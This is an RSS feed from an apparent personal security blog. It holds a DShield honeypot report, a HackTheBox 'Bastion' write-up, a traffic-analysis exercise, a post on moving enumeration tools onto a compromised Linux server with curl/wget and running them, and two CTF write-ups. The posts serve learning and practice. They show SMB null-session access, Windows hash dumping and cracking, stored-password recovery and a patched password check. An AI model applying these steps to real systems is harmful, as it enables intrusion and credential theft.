<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <docs>https://blogs.law.harvard.edu/tech/rss</docs>
    <title>post on theyknow</title>
    <link>https://domain.example/categories/post/</link>
    <description>Recent content in post on theyknow</description>
    <image>
      <title>post on theyknow</title>
      <link>https://domain.example/categories/post/</link>
      <url>https://images.alphacoders.com/712/thumb-1920-712781.jpg</url>
    </image>
    <ttl>1440</ttl>
    <generator>After Dark 9.1.0 (Hugo 0.57.2)</generator>
    <language>en-US</language>
    <lastBuildDate>Sat, 12 Oct 2019 10:03:58 UT</lastBuildDate>
    <atom:link href="https://domain.example/categories/post/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Sunday honeypot analysis</title>
      <link>https://domain.example/post/honeypot-analysis/</link>
      <pubDate>Sat, 05 Oct 2019 23:00:00 UT</pubDate>
      <dc:creator>theyknow</dc:creator>
      <guid>https://domain.example/post/honeypot-analysis/</guid>
      <description>About the Internet Storm Center and Dshield The Internet Storm Center (ISC) was created in 2001 and has been analyzing threats and problems since then with the help of volunteers around the world. In their own words: &amp;ldquo;The ISC uses the DShield distributed intrusion detection system for data collection and analysis. DShield collects data about malicious activity from across the Internet. This data is cataloged and summarized and can be used to discover trends in activity, confirm widespread attacks, or assist in preparing better firewall rules&amp;rdquo;.</description>
      <category domain="https://domain.example/categories/post">Post</category>
      <content:encoded><![CDATA[ About the Internet Storm Center and Dshield The Internet Storm Center (ISC) was created in 2001 and has been analyzing threats and problems since then with the help of volunteers around the world. In their own words: &amp;ldquo;The ISC uses the DShield distributed intrusion detection system for data collection and analysis. DShield collects data about malicious activity from across the Internet. This data is cataloged and summarized and can be used to discover trends in activity, confirm widespread attacks, or assist in preparing better firewall rules&amp;rdquo;.
Pretty cool, right? Volunteers can set up DShield on a Raspberry Pi for example, or a VPS like I did, save in DShield their API key from their ISC account, and reports will be sent to ISC twice an hour! And you have a full overview of what and who has been targeting your honey pot as well as 404 reports. Here is how it looks:
As you can see, today there has been already over 5.000 reported scans of my honeypot (and it&amp;rsquo;s only 3pm here) and I can also see more info about the sources:
Here is an example of a source that has been scanning my honeypot today a lot for port 22. Of course, these scans are rarely made by an actual hacker, but rather by bots that were created by different hacking organizations including state-sponsored groups and that are looking for vulnerable systems on the internet 24&amp;frasl;7. As you can see, this IP comes from China and ISC gives a lot more info on the page too.
My long-term plan is to develop a python script that would take each reports available from a certain date range, and build a more interesting report out of this larger sample instead of presenting only one day. If you want to check a specific day in the past, you need to download an excel report and my excel skills are terrible so let’s stick to Sunday as ISC provides use already with a nice report page for today. Alright, let’s have a look!

The ports The most important piece of information is the targeted ports. It gives us a better understanding of the threats currently out in the wild. If there is a clear spike in the scan of a particular port it indicates the beginning or return of a broad-based attacks, or some type of worm that uses vulnerable systems to scan for more victims after it infects them.
Here we can see that my honeypot has been largely scanned for port 22, which is the standard port for the SSH remote login protocol. I have noticed that it stays as the top 3 most scanned port everyday, probably to try brute-forcing it (get access to the machine by ssh and you’re in…) and also possibly to find a response from two old trojans that are possibly still active, like Shaft:
Name: Shaft
Ports: 22, 5002, 18753 (UDP), 20432, 20433 (UDP)
Files: idle - 28,969 bytes tcp.log - ??? bytes pp.pl - 2,795 bytes sniff.pid - 6 bytes s - 7,654 bytes chattr - 7,656 bytes vi - 437,428 bytes tcsh - 262,756 bytes ps - 31,312 bytes shaftmaster - 25,123 bytes shaftnode - 15,184 bytes shaftnode.c - 19,806 bytes hitlist - ??? bytes
Created: Oct 1998
Actions: Distributed DoS tool / Steals passwords. Is able to either send UDP, TCP or ICMP floods, or all three at the same time.
Lenguage: Written in C.  The next most scanned is port 23. As I understand it, this one has always been a clear favorite and, as explained in this ISC report, the exploit compromises telnet servers following this procedure:
1- brute force password (usually a well known default password)
2- Download additional malware via ftp/http or tftp (typically multiple binaries for various architectures)
3- run the malware, which will typically setup a client for a DDoS botnet.
So if you&amp;rsquo;re running a telnet server: change your default password!
The 3rd most scanned was port 465 and there has been a lot going on since 1995 around this port! But realted to security, there was not much information about why this port should be scanned so much. I found the CVE-2011-4015 which &amp;ldquo;allows remote attackers to cause a denial of service (interface queue wedge) via malformed UDP traffic on port 465, aka Bug ID CSCts48300&amp;rdquo;. Not too exciting.
Port 445 was also heavily scanned. This port can be used by hackers to remotely commandeer Windows machines, and the overall consensus is that you do NOT want this port to be exposed to the internet. Just have a look at this terrible list of trojans and worms.
One port that has been scanned a lot more in the last couple of months is port 1443:
As explained in CVE-2014-4684, &amp;ldquo;the database server in Siemens SIMATIC WinCC before 7.3, as used in PCS7 and other products, allows remote authenticated users to gain privileges via a request to TCP port 1433&amp;rdquo;. Interesting that the port for this CVE from 2014 has been scanned for a lot in the last 2 months&amp;hellip;

The sources Three main IP come out on top:
 218.92.0.208: China. Bruteforcing port 80 and 22.
 92.118.38.53: Romania. Fairly new, not much info about previous reports.
 112.85.42.72: China. Old IP used for Forum spamming, now an Asterisk VoIP and port 22 Scanner.
  
The rest of the world Here is more details about all the info collected by the DShield honeypots around the world:
And the top 10 offensive IPs where I added the country of origin:
There is a lot more information but I thought it was already a good start! I had a lot of fun putting all this info together and hopefully I can do a similar one every Sunday. Please have a look at DShield and consider contributing to the project. If you need help setting it up, feel free to contact me on Twitter!
]]></content:encoded>
    </item>
    <item>
      <title>HTB Write-up: Bastion</title>
      <link>https://domain.example/post/bastion/</link>
      <pubDate>Sun, 08 Sep 2019 10:40:00 UT</pubDate>
      <dc:creator>theyknow</dc:creator>
      <guid>https://domain.example/post/bastion/</guid>
      <description>The Bastion Windows box retired this weekend on HackTheBox. It was a Windows box, quite easy to solve but learned a lot along the way. It&amp;rsquo;s my first write-up of a HTB box so it might not be the best but hopefully it will be a nice summary! We learn about SMB, mounting VHD in Linux, stealing Windows hashes, cracking them with John, and exploiting a program for Privesc.</description>
      <category domain="https://domain.example/categories/post">Post</category>
      <content:encoded><![CDATA[ The Bastion Windows box retired this weekend on HackTheBox. It was a Windows box, quite easy to solve but learned a lot along the way. It&amp;rsquo;s my first write-up of a HTB box so it might not be the best but hopefully it will be a nice summary! We learn about SMB, mounting VHD in Linux, stealing Windows hashes, cracking them with John, and exploiting a program for Privesc.
1: Recon First, I do the usual nmap scan I start with on all boxes: nmap -A -oN nmap-bastion.txt 10.10.10.134
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-20 08:43 GMT
Nmap scan report for 10.10.10.134
Host is up (0.34s latency).
Not shown: 996 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: -40m01s, deviation: 1h09m15s, median: -2s
| smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
| Computer name: Bastion
| NetBIOS computer name: BASTION\x00
| Workgroup: WORKGROUP\x00
|_ System time: 2019-07-20T10:43:23&#43;02:00
| smb-security-mode: | account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb2-security-mode: | 2.02: |_ Message signing enabled but not required
| smb2-time: | date: 2019-07-20 08:43:22
|_ start_date: 2019-07-20 02:31:48  The open ports are not too exciting but we&amp;rsquo;ve got SMB, so let&amp;rsquo;s see if we can exploit it. root@kali:~/Desktop/HTB/Bastion# smbclient -L //10.10.10.134
Enter WORKGROUP\Root&#39;s password: Sharename Type Comment
--------- ---- -------
ADMIN$ Disk Remote Admin
Backups Disk C$ Disk Default share
IPC$ IPC Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available  Alright, now we can access Backups by using Null session: root@kali:~/Desktop/HTB/Bastion# smbclient //10.10.10.134/backups
Enter WORKGROUP\&#39;s password:
Try &#34;help&#34; to get a list of possible commands.
smb: \ l
. D 0 Fri Sep 6 13:39:45 2019
.. D 0 Fri Sep 6 13:39:45 2019
note.txt AR 116 Tue Apr 16 12:10:09 2019
pFESbxwaWT D 0 Fri Sep 6 13:39:45 2019
SDT65CB.tmp A 0 Fri Feb 22 14:43:08 2019
WindowsImageBackup D 0 Fri Feb 22 14:44:02 2019
7735807 blocks of size 4096. 2759330 blocks available  I found note.txt but nothing interesting there. But there is a directory called WindowsImageBackup!

2: Mounting the VHD to get user In the WindowsImageBackup we find 2 VHD files: 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd A 37761024 Fri Feb 22 14:44:03 2019
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd A 5418299392 Fri Feb 22 14:45:32 2019  They are big files so we want to avoid downloading them. After a LOT of googling and every more failed attempts, I found the way to mount VHD files in linux. First I needed to install CIFS: root@kali:~/Desktop/HTB/Bastion# sudo apt-get install cifs-utils
 The first and smaller VHD didn&amp;rsquo;t contain anything of interest so let&amp;rsquo;s go straight to the second one: root@kali:~/Desktop/HTB/Bastion# mount.cifs //10.10.10.134/Backups ./mount
root@kali:~/Desktop/HTB/Bastion# guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --ro ~/Desktop/HackTheBox/Bastion/vhd-mount2 -m /dev/sda1  Wait a few seconds and the VHD should appear as a mounted folder in your system now! I checked the Users folder but nothing there which means there is another step to getting user.txt. After getting back to more googling, I found some info about extracting the hashes in a Windows backup in /System32/config by using samdump2: samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::  I saved the hash in a txt file to crack it with john: root@kali:~/Desktop/HTB/Bastion# john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=3
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
bureaulampje (L4mpje)
1g 0:00:00:05 DONE (2019-07-20 12:55) 0.1709g/s 1606Kp/s 1606Kc/s 1606KC/s burg772v..burdy1
Use the &#34;--show --format=NT&#34; options to display all of the cracked passwords reliably
Session completed  Awesome I got the password &amp;ldquo;bureaulampje&amp;rdquo;! I know SSH is available on this box from the nmap scan: root@kali:~/Desktop/HTB/Bastion# ssh L4mpje@10.10.10.134  And I find the user.txt on the Desktop of the machine!

3: Priviledge Escalation I did a lot of enumeration suggested on different Windows privesc guides, and finally found a weird program sitting in Program Files called nRemoteNG. A quick google search shows that it is vulnerable and can get us admin password: http://hackersvanguard.com/mremoteng-insecure-password-storage/
I download nRemoteNG on my Windows VM. I used WinSCP to access C:\Users\L4mpje\AppData\Roaming\mRemoteNG and download consConf.xml on my VM. Then I import it on nRemoteNG and to see the clear text of a given password, go to “Tools” &amp;gt; “External Tools”. Then right-click in the white space and choose “New External Tool”. Next, in the External Tools Properties, fill in a “Display Name”, “Filename” and some “arguments”, with “Password lookup”, CMD and “/k echo %password%” respectively.
Then right click on the Bastion connection, external tool, Password Lookup, and we get the Admin password. We can now SSH with Administrator and get the root flag! root@kali:~/Desktop/HTB/Bastion# ssh Administrator@10.10.10.134
 ]]></content:encoded>
    </item>
    <item>
      <title>Writeup: TRAFFIC ANALYSIS EXERCISE</title>
      <link>https://domain.example/post/malware-traffic-analysis/</link>
      <pubDate>Fri, 09 Aug 2019 23:00:00 UT</pubDate>
      <dc:creator>theyknow</dc:creator>
      <guid>https://domain.example/post/malware-traffic-analysis/</guid>
      <description>Malware Traffic Analysis @malware_traffic&amp;rsquo;s blog has a lot of knowledge so I highly recommend to bookmark it somewhere. The real treasure is of course the amazing exercises page. Depending on the exercise, you get a pcap and other files. The pcap file is a traffic capture which we can analyse in Wireshark and find out where things went wrong!
Being able to effectively analyse traffic is a very important skill for the security for any organisation.</description>
      <category domain="https://domain.example/categories/post">Post</category>
      <content:encoded><![CDATA[ Malware Traffic Analysis @malware_traffic&amp;rsquo;s blog has a lot of knowledge so I highly recommend to bookmark it somewhere. The real treasure is of course the amazing exercises page. Depending on the exercise, you get a pcap and other files. The pcap file is a traffic capture which we can analyse in Wireshark and find out where things went wrong!
Being able to effectively analyse traffic is a very important skill for the security for any organisation. It helps the security team to find out where the problem happened and how to mitigate it. It is also super fun!

The first exercise Today, I&amp;rsquo;ll start with the exercise &amp;ldquo;2014-11-16 - TRAFFIC ANALYSIS EXERCISE&amp;rdquo;. The writeup will be about the level 1 and level 2 questions this time:
LEVEL 1 QUESTIONS:
1) What is the IP address of the Windows VM that gets infected?
2) What is the host name of the Windows VM that gets infected?
3) What is the MAC address of the infected VM?
4) What is the IP address of the compromised web site?
5) What is the domain name of the compromised web site?
6) What is the IP address and domain name that delivered the exploit kit and malware?
LEVEL 2 QUESTIONS:
1) What is the redirect URL that points to the exploit kit (EK) landing page?
2) Besides the landing page (which contains the CVE-2013-2551 IE exploit), what other exploit(s) sent by the EK?
3) How many times was the payload delivered?
4) Submit the pcap to VirusTotal and find out what snort alerts triggered. What are the EK names are shown in the Suricata alerts?

Level 1 questions 1) What is the IP address of the Windows VM that gets infected?
The source of all traffic is 172.16.165.165, so I can assume that this is the infected VM.
2) What is the host name of the Windows VM that gets infected?
There are many ways to check that as demonstrated in this article. I chose to filter the traffic on bootp to reveal the DHCP traffic. I selected one of the frames, and in the frame details, I went to Bootstrap Protocol and then in the options we find the hostname and MAC address: 3) What is the MAC address of the infected VM?
We got the MAC address in the 2nd question, but alternatively, we can see it in all the frames&amp;rsquo; details: 4) What is the IP address of the compromised web site?
If we filter the GET requests (http.request.method == GET), we can follow the referers. The user visited &amp;ldquo;ciniholland&amp;rdquo; and through the referers of each GET requests, we see that it leads to a very suspicious website which initiates downloads on the machine.
So I assume ciniholland.nl/ is the compromised website and its IP is 82.150.140.30
5) What is the domain name of the compromised web site?
Answered above: ciniholland.nl/
6) What is the IP address and domain name that delivered the exploit kit and malware?
If we follow the GET requests, we can clearly see that the final website initiates downloads on the now compromised machine: And its IP address is 37.200.69.143

Level 2 questions 1) What is the redirect URL that points to the exploit kit (EK) landing page?
As I checked the different GET requests in the first level, I found out that the referer to the first EK landing page (stand.trustandprobaterealty.com) was: 24corp-shop.com
I can also export the HTML object (File &amp;ndash;&amp;gt; Export Object &amp;ndash;&amp;gt; HTTP), then download the 24corp-shop.com html file. Open it in a text editor and I find: 2) Besides the landing page (which contains the CVE-2013-2551 IE exploit), what other exploit(s) sent by the EK?
By checking the the HTML object (File &amp;ndash;&amp;gt; Export Object &amp;ndash;&amp;gt; HTTP), I can see two other exploits: a Flash and a Java. Alternatively, I had found them during my first recon in the list of HTTP GET requests by following the HTTP stream: 3) How many times was the payload delivered?
I&amp;rsquo;m not 100% sure, but I can&amp;rsquo;t see any other name for the payload than x-msdownload, and a quick filtering give us 3 deliveries: 4) Submit the pcap to VirusTotal and find out what snort alerts triggered. What are the EK names are shown in the Suricata alerts?
I didn&amp;rsquo;t know about VirusTotal, so it was a nice question to introduce it. Here is what I found there: ET CURRENT_EVENTS GoonEK ET CURRENT_EVENTS Goon/Infinity URI Struct EK ET CURRENT_EVENTS RIG EK

This is all for today! I learned a lot through each question. It&amp;rsquo;s a quick writeup, but I spend a lot of time digging for the answers. I won&amp;rsquo;t do a writeup for all the exercises, but I will make one for the most interesting exercises.
Thank you for reading this and get in contact if you have any question, recommendation, spotted mistakes, etc.
]]></content:encoded>
    </item>
    <item>
      <title>Upload enumeration tools to a linux server</title>
      <link>https://domain.example/post/upload-tools/</link>
      <pubDate>Sat, 20 Jul 2019 23:00:00 UT</pubDate>
      <dc:creator>theyknow</dc:creator>
      <guid>https://domain.example/post/upload-tools/</guid>
      <description>Privilege Escalation (privesc) When getting access to a server, either during a CTF or a pentesting assignment, you will probably have a limited access to the server itself. Probably because you accessed it through a compromised user. Your goal is to find a way to become root which would give you unlimited access to the server and the running programs. See, developers and sysadmins can make mistakes and have the programs running with the wrong settings.</description>
      <category domain="https://domain.example/categories/post">Post</category>
      <content:encoded><![CDATA[ Privilege Escalation (privesc) When getting access to a server, either during a CTF or a pentesting assignment, you will probably have a limited access to the server itself. Probably because you accessed it through a compromised user. Your goal is to find a way to become root which would give you unlimited access to the server and the running programs. See, developers and sysadmins can make mistakes and have the programs running with the wrong settings. Leveraging these mistakes can give you the keys to root.
Here are two extensive guides about privesc for Windows and Linux:  Windows privesc guide Linux privesc guide 
You&amp;rsquo;ll notice in these guides that, to find the mistakes that will get us root, it&amp;rsquo;s all about enumerating the server permissions, the programs running, the cron jobs, etc. And we have tools to do that for us!
I have a very limited experience in Windows privesc so I will explain how to upload enumeration tools to Linux servers only in this post. The tools From my Tools list, you&amp;rsquo;ll find these two very useful enumeration tools:
pspy pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.  LinEnum Scripted Local Linux Enumeration &amp; Privilege Escalation Checks.  The command lines So now that we have the tools on our computer, how to get them to the compromised server?
Quite simple: we will use a python module called SimpleHTTPServer. It is normally used like other modules in python programs, but the SimpleHTTPServer module can also be invoked directly using the -m switch of the interpreter with a port number argument. This serves the files relative to the current directory.
python -m SimpleHTTPServer 80  With python3: python3 -m http.server 80  Now anyone with your IP address and this port number can access this directory and its files through HTTP request, including the compromised server!
So we launch the SimpleHTTPServer from the directory where we have our LinEnum and pspy programs. And from the compromised linux server, we write: curl $yourIP/linenum.sh  cURL is a command-line tool for getting or sending data including files using URL syntax. Now your downloaded program won&amp;rsquo;t have the permission to run so to make it executable, write: chmod &#43;x linenum.sh  And now to execute it, write &amp;ldquo;./linenum.sh&amp;rdquo; in the server directory where the downloaded linenum program is.
Sometimes, curl will not be authorized to be used by the user you compromised, but you can use wget in this case. Let&amp;rsquo;s use pspy this time as an example: wget $yourIP/pspy64  Same thing now, we do &amp;ldquo;chmod &#43;x pspy64&amp;rdquo; and then &amp;ldquo;./pspy64&amp;rdquo;, and it will run!
I hope this was a useful article! There are probably other ways to upload files to a server such as using netcat, but I found the commands in this post to be the simplest for me. And of course I took the example of enumeration tools, but you can use it to upload many more useful tools you would need for your privesc!
Have fun uploading files now!
]]></content:encoded>
    </item>
    <item>
      <title>i18 Challenge - Part 2</title>
      <link>https://domain.example/post/i18-2/</link>
      <pubDate>Wed, 17 Jul 2019 08:40:00 UT</pubDate>
      <dc:creator>theyknow</dc:creator>
      <guid>https://domain.example/post/i18-2/</guid>
      <description>5: Lett fluidmekanikk An executable file.
Clue one: The program also accepts the password as an argument.
Clue two: The password exists (perhaps) in a dictionary.
We get an executable file asking for a password. Enter the wrong one and it quits. I&amp;rsquo;m a complete beginner in Reverse Engineering but I have enjoyed a few tutorial videos so let&amp;rsquo;s jump right in with Immunity.
When you open the file, right click  View  module ‘crackme’.</description>
      <category domain="https://domain.example/categories/post">Post</category>
      <content:encoded><![CDATA[ 5: Lett fluidmekanikk An executable file.
Clue one: The program also accepts the password as an argument.
Clue two: The password exists (perhaps) in a dictionary.
We get an executable file asking for a password. Enter the wrong one and it quits. I&amp;rsquo;m a complete beginner in Reverse Engineering but I have enjoyed a few tutorial videos so let&amp;rsquo;s jump right in with Immunity.
When you open the file, right click  View  module ‘crackme’. Then right click  Search for  All reference text strings. It will show you the lines of text that the software shows us, for example &#34;ASCII &#34;Please enter your password: “”. Double click on this one.  Now the goal is to find a way to bypass the login system. If we check the other strings we can see a password!
008B161B . C785 6CFDFFFF 78428C00 MOV DWORD PTR SS:[EBP-294],crackme.008C4; ASCII &#34;pAss0rd1337&#34;  If we try it though, the program just trolls us and shows &amp;ldquo;Good job! Incorrect password, though.&amp;rdquo; before exiting.
The important part to look for now are the JNZ: JNZ - The jump WILL take place if the Z Flag is NOT zero (1)
CMP - If the two values are equal, the Z Flag is set (1) otherwise it is not set (0)  We see several JNZ, and if we check the one right after the fake password trolling, it goes to 008B172B. So this is the exit of the program. What about the correct answer though?
In this screenshot, we can see that right before the Correct line, we have a jump happening that goes to 008B171E which is the Incorrect option and then the program exit. So by simply replacing the assembly of this jump with JZ, we bypass the verification system as now it will avoid the jump if the password is NOT the right one and give us the Correct answer!
6: For the record&amp;hellip; This is just to look up.
Clue one: For example, in a distributed, hierarchical directory service.
Clue two: challenge.i18.no. CLASS1 TYPE16
The look up part gave it up kind of for me. I started directly looking for a DNS recon using nslookup: nslookup challenge.i18.no
Server:	10.11.0.1
Address:	10.11.0.1#53
Non-authoritative answer:
Name:	challenge.i18.no
Address: 185.56.186.11
 Now I checked all the possible record types: A, MX, and TXT.
In the TXT records we find the answer!
7: Not quite a 0day Another executable file. Apparently vulnerable, by the file name to judge. Hmm.
Clue one: The task can be solved in several ways.
Clue two: Some features of C can make your program vulnerable if you use them incorrectly.
Clue three: Look for square brackets and align in ascending order.
I spent a long time on this one. I thought it would be another Reverse Engineering job so started to look at the program in Immunity, but for almost 2hrs I couldn&amp;rsquo;t find anything. I checked the first two clues which confused me even more so after another half an hour of googling about C vulnerabilities, I checked the last clue. It said to look for square brackets, so I did just that in Immunity.
Found 13 lines of them and after ordering them, the letters contained in each bracket make up the line “hacktheplanet”.
echo -n hacktheplanet | sha256sum
48f6018bc6898a5c9e61d549b174131c07ed70542ba1c326289b9cc35af22f84  Probably the weirdest challenge so far, very puzzle / CTF-like.
8: På riktig bølgelengde Clue: Things are not always as they appear.
We just got this image. After doing a little bit of info recon on the file itself, not much comes up except the size of it for such a small image. So that and the clue tells me that something is up.
After a little bit of research, I find this useful article about hidden files in images. One important information is that in the HEX, a jpg has the terminating byte of ffd9. If we search for it with: cat logo.jpg | grep &#39;ffd9&#39;  We see that there is still a lot going on after the ffd9 where it should have ended. We have “4944 3303” as the following bytes, and with a quick google search we find out that it is the initial bytes of an MP3 file. Still thanks to the previous article, we know that we can use the dd command to extract it. But first we need to find the offset in an hex editor. I used Bless Hex Editor which has a nice and simple GUI. I found the offset “0x3BD8” where the MP3 file starts:
Still according to the article linked above: “dd only takes decimal values, so we convert the hexadecimal location from hex to decimal”. Which gives us the decimal 15320. Now we can run the dd command:
dd if=logo.jpg bs=1 skip=15320 of=logo.mp3  The file is created but after that I have been lost for too long. I can&amp;rsquo;t find a way to make this MP3 work so I gave up for now, and I&amp;rsquo;ll probably come back to this challenge later. If anyone spots an obvious mistake I made, please contact me!
See you for part 3!
]]></content:encoded>
    </item>
    <item>
      <title>i18 Challenge - Part 1</title>
      <link>https://domain.example/post/i18-1/</link>
      <pubDate>Wed, 10 Jul 2019 10:40:00 UT</pubDate>
      <dc:creator>theyknow</dc:creator>
      <guid>https://domain.example/post/i18-1/</guid>
      <description>The i18 has 13 challenges that you can find at this address. This CTF is in Norwegian, but has a very small amount of text so google translate is more than enough, but I will translate the text and clues to english here. This is the first part of my writeup where I will do the first 4 challenges. It is very possible that I will make mistakes or take longer path to the flag, so if you have any recommandation or correction, feel free to contact me by email or twitter.</description>
      <category domain="https://domain.example/categories/post">Post</category>
      <content:encoded><![CDATA[ The i18 has 13 challenges that you can find at this address. This CTF is in Norwegian, but has a very small amount of text so google translate is more than enough, but I will translate the text and clues to english here. This is the first part of my writeup where I will do the first 4 challenges. It is very possible that I will make mistakes or take longer path to the flag, so if you have any recommandation or correction, feel free to contact me by email or twitter. And same if you have questions or things you would like to know more about! Alright let&amp;rsquo;s jump in!
1: Ren rutine Task: First task and this is simple. The answer we are looking for is sha256(lett som en plett).
This one seems fairly easy: just generates the sha256 hash for the sentence ‘lett som en plett’. Just type this command: echo -n &#39;lett som en plett&#39; | sha256sum  It will give: b3df0e709c60b6c3790941a49d989dcd1911b1e25eba18afdb08f78820a1b8cf
And it works! First flag!
2: This Must Be The Place Task: We have put this on our head completely.
No more info than that. But it says the &amp;ldquo;head&amp;rdquo; so I would imagine it has something to do with the header, so let&amp;rsquo;s look at the page header! A quick way to do that is to right click, inspect element, go to to the network tab and click on the first GET request which is for this specific page. In the header, we do find a strange parameter called X-Answer with the value: b8e63fba4504b3c29e582cc3d1f6cc56918998d50e55b1af3382080506f2f969
And indeed it works! We could also have just pinged the page to get the header back: curl -I https://challenge.i18.no/level/fbmserjd3dwtvrspnk8ektmxsvdenwvp  3: I Skyggene Task: nsm:$1$asH66rpo$gkIQMSAA.QS/ah5VZvrYi0:16403:0:99999:7::: Clue one: Passwords that follow predictable patterns make them easier to crack.
Clue two: An article explaining why Summerferie2014 is a bad password.
The clues are completely essential for me here because I have very little experience in crypto challenges. I can easily guess that it will follow the pattern of Summerferie2014 though. So one word and then one number (probably a year). As it is in Norwegian, we can&amp;rsquo;t use already premade wordlists I have in English.
To find a list of words wasn&amp;rsquo;t easy but I found an old scrabble website that had one in their rules page by googling ordboka: https://www.ordspill.no/rules/ which redirects us in the end to this website with a downloadable list: http://www2.scrabbleforbundet.no/wp-content/uploads/2016/10/nsf2016.zip
I wonder if they know their innocent scrabble list can be used to crack passwords. Anyway this probably took me almost an hour but we got it! Oh yes, the actual challenge now.
We save the hash in a text file and after running a normal command with john (john hash.txt &amp;ndash;wordlist=nsf2016.txt), it doesn&amp;rsquo;t manage to crack the password. So we probably need to help it by adding a rule as we know the format of the possible password (common word &#43; number/year).
According to this article: https://www.gracefulsecurity.com/custom-rules-for-john-the-ripper/ - we should be able to create that by adding to the john&amp;rsquo;s Config file (etc/john/john.conf) this rule: [List.Rules:wordDate]
cAz&#34;201[0-9]&#34;  Basically it will try every word on the list with a first capital letter, then 201 and add 0 to 9 at the end, giving for example Stanley2012. The “c” at the beginning tells john to remove the rule of the initial capital letter if it doesn&amp;rsquo;t find anything. So after the right command: john hash.txt --wordlist=nsf2016.txt --rules=wordDate  It tells me that it cracked it with the result being “Demokrati2015”. For some reason, the CTF did not accept this answer and I couldn&amp;rsquo;t understand why. But then I remembered that the previous answers were hashed in sha256 so I did the same with Demokrati2015 and it worked. echo -n Demokrati2015 | sha256sum a4e3e09a00b0706add935ebdf627dc57bfb6e9d53b0be2c60754ad5865ce3c4f  4: Broen A file. What is hiding in this.
Clue: sha256(lc(nameofaplace))
Ok so we get a file to download. Awesome! I love to do forensic challenges. The file is called data.bin. Let&amp;rsquo;s check what it could be with a simple command: file data.bin “data.bin: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)”  Great! A pcap file. I&amp;rsquo;m deep into a network security ebook so I recognise the extension directly. Basically for those that don&amp;rsquo;t know, pcap means Packet Capture Data. The file was generated through packet sniffing by the free software Wireshark. So let&amp;rsquo;s open the software and have a look at this capture. It&amp;rsquo;s a short packet capture and we see directly that there was a successful HTTP request and another request after that for an image:
If we continue down through this image request, we see that it was also successful:
Which means there is an image in this packet capture. To get the files transfered through HTTP, go to file -&amp;gt; Export Objects -&amp;gt; HTTP. Let&amp;rsquo;s have a look at this picture:
Interesting&amp;hellip; It looks like a google map picture of a bridge (Broen, the title of the challenge means bridge in Norwegian). As the clue is about finding the name of a place, I can guess already that if we find where this bridge is, we should be good to go. Let&amp;rsquo;s start by checking the website that is written as Copyright. But we don&amp;rsquo;t find anything there, just an interactive map and I&amp;rsquo;m not going to visit all the places in Norway looking for this bridge. Let&amp;rsquo;s analyze the image then.
I did not find anything interesting by checking the usual commands like identify, file, exiv2. So after some googling I found an article by Nullbyte about extracting hidden information in images through exiftool. I quickly installed it and after running it, we get an interesting information:
A GPS position! Alright now we&amp;rsquo;re getting somewhere. I go straight to a GPS coordinate website, enter the coordinates and BOOM! We know that the bridge is in Eidsvoll. Fun fact: the Norwegian constitution was drafted and signed in Eisdvoll on the 17th of May 1814 by the constitutional assembly. And this is now the Norwegian national day.
Let&amp;rsquo;s finish the challenge now:
echo -n eidsvoll | sha256sum e6b46a50991986097e4a309076cc0760be4c7a643f62e42b07adaf14a7fe30d4  Success! See you in part 2!
]]></content:encoded>
    </item>
  </channel>
</rss>
